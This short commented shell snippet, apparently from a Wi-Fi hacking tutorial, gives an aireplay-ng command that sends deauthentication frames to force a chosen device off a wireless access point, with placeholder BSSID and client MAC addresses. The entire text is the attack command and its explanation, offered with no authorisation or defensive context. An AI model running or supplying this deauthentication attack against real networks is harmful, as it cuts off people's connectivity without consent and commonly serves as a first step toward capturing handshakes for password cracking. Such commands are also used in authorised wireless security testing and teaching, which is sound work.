# for simplicity, the interface we will be using is wlan0mon, however, you must use your specific interface for your system

# Attack command that will disconnect the device
sudo aireplay-ng --deauth 10 -a 00:11:22:33:44:55 -c 66:77:88:99:AA:BB wlan0mon

# Where 00:11:22:33:44:55 is the BSSID of the access point on the router and 66:77:88:99:AA:BB is the MAC address of the targeted device
